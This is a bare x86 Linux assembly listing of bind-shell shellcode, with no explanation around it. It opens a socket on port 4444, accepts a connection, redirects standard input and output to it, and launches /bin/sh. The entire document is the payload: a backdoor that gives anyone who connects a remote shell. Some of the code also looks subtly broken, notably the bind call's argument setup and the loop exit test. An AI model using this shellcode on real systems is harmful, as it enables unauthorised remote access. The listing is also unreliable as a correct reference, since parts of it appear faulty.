section .text
    global _start

_start:
    ; Create a socket
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x1
    push 0x6
    push 0x1
    push 0x2
    mov ecx, esp
    int 0x80
    mov esi, eax

    ; Bind to a port
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x2
    push 0x0
    push word 0x5c11 ; Port 4444
    push word 0x2
    mov ecx, esp
    int 0x80

    ; Listen for connections
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x4
    push 0x1
    push esi
    mov ecx, esp
    int 0x80

    ; Accept a connection
    xor eax, eax
    mov al, 0x66
    xor ebx, ebx
    mov bl, 0x5
    push 0x0
    push 0x0
    push esi
    mov ecx, esp
    int 0x80
    mov edi, eax

    ; Duplicate file descriptors
    xor ecx, ecx
    mov cl, 0x3
dup_loop:
    dec cl
    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    int 0x80
    jnz dup_loop

    ; Execute a shell
    xor eax, eax
    mov al, 0xb
    push 0x0
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push 0x0
    push ebx
    mov ecx, esp
    int 0x80
